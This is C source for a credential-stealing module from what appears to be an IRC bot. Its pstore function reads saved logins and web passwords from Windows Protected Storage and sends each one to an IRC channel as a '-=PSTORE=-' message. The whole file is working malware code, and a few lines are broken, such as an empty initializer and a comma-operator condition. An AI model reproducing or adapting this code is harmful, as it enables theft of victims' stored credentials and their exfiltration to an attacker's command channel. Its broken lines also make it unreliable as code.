#include "..\Inc.h"
#include "..\Fun.h"
#include "..\Ext.h"

void __stdcall _com_issue_errorex(long,struct IUnknown *,struct _GUID const &){return;}
void __stdcall _com_issue_error(long){return;}

DWORD WINAPI pstore (LPVOID param)
{
	SOCKS4 socks4 = *((SOCKS4 *)param);
	SOCKS4 *socks4p = (SOCKS4 *)param;
	pststrct pStorInfo = ;
	char sendbuf[IRCLINE];

	//	ImpersonateInteractiveUser();
	typedef HRESULT (__stdcall *PSCI)(IPStore **, DWORD, DWORD, DWORD);
	PSCI fPStoreCreateInstance;
	HMODULE pstorec_dll = LoadLibrary("pstorec.dll");
    if (pstorec_dll)
		fPStoreCreateInstance = (PSCI)GetProcAddress(pstorec_dll,"PStoreCreateInstance");
	else
		return 0;
	//	if (!IsServiceRunning("ProtectedStorage"))
	//		return 0;
	int iSent=0;
	IPStorePtr PStore; 
	HRESULT hRes=fPStoreCreateInstance(&PStore, 0, 0, 0);
	if (FAILED(hRes))
		return 0;
	IEnumPStoreTypesPtr EnumPStoreTypes;
	hRes=PStore->EnumTypes(0, 0, &EnumPStoreTypes);
	if (FAILED(hRes))
		return 0;
	GUID TypeGUID;
	char szItemName[512];
	char szItemData[512];
	char szResName[1512];
	char szResData[512];
	char szItemGUID[50];
	while(EnumPStoreTypes->raw_Next(1,&TypeGUID,0) == S_OK)
	{
		wsprintf(szItemGUID,"%x",TypeGUID);
		IEnumPStoreTypesPtr EnumSubTypes;
		hRes = PStore->EnumSubtypes(0, &TypeGUID, 0, &EnumSubTypes);
		GUID subTypeGUID;
		while(EnumSubTypes->raw_Next(1,&subTypeGUID,0) == S_OK)
		{
			IEnumPStoreItemsPtr spEnumItems;
			HRESULT hRes=PStore->EnumItems(0, &TypeGUID, &subTypeGUID, 0, &spEnumItems);
			LPWSTR itemName;
			while(spEnumItems->raw_Next(1,&itemName,0) == S_OK)
			{
				wsprintf(szItemName,"%ws",itemName);			 
				char chekingdata[200];
				unsigned long psDataLen = 0;
				unsigned char *psData = NULL;
				_PST_PROMPTINFO *pstiinfo = NULL;
				hRes = PStore->ReadItem(0,&TypeGUID,&subTypeGUID,itemName,&psDataLen,&psData,pstiinfo,0);
				if(lstrlen((char *)psData),(psDataLen-1))
				{
					int i=0;
					for(unsigned int m = 0;m<psDataLen;m+=2)
					{
						if(psData[m]==0)
							szItemData[i]=',';
						else
							szItemData[i]=psData[m];
						i++;
					}
					szItemData[i-1]=0;				  			
				}
				else
				{
					wsprintf(szItemData,"%s",psData);				  
				}	
				lstrcpy(szResName,"");
				lstrcpy(szResData,"");
				if (lstrcmp(szItemGUID,"5e7e8100")==0)
				{				  
					lstrcpy(chekingdata,"");
					if(strstr(szItemData,":")!=0)
					{
						lstrcpy(chekingdata,strstr(szItemData,":")+1);
						*(strstr(szItemData,":"))=0;				  
					}
					iSent++;
					if ((strcmp(szItemData,"") && strcmp(chekingdata,"")))
						//	irc.msg (CHANNEL_INFO, "pstore", "%s %s:%s", szItemName, szItemData, chekingdata);
						
						sprintf(sendbuf,"-=PSTORE=- %s %s:%s", szItemName, szItemData, chekingdata);
					irc_privmsg( exinfo.sock, exinfo.chan, sendbuf, exinfo.notice );
					addlog(sendbuf);
				}
				if (lstrcmp(szItemGUID,"e161255a")==0)
				{
					if (strstr(szItemName,"StringIndex")==0)
					{
						if(strstr(szItemName,":String")!=0)
							*strstr(szItemName,":String")=0;
						lstrcpyn(chekingdata,szItemName,8);			  
						if (strstr(chekingdata,"http:/") || strstr(chekingdata,"https:/"))
						{
							lstrcpy(chekingdata,"");
							if(strstr(szItemData,",")!=0)
							{
								lstrcpy(chekingdata,strstr(szItemData,",")+1);
								*(strstr(szItemData,","))=0;				  
							}
							iSent++;
							if ((strcmp(szItemData,"") && strcmp(chekingdata,"")))
								sprintf(sendbuf,"-=PSTORE=- %s %s:%s", szItemName, szItemData, chekingdata);
							irc_privmsg( exinfo.sock, exinfo.chan, sendbuf, exinfo.notice );
							addlog(sendbuf);
						}	
					}
				}
				ZeroMemory(szItemName,sizeof(szItemName));
				ZeroMemory(szItemData,sizeof(szItemData));
				Sleep (1000);
			}
		}
	}
	return 0;
}
/* ciao dreamwork :)*/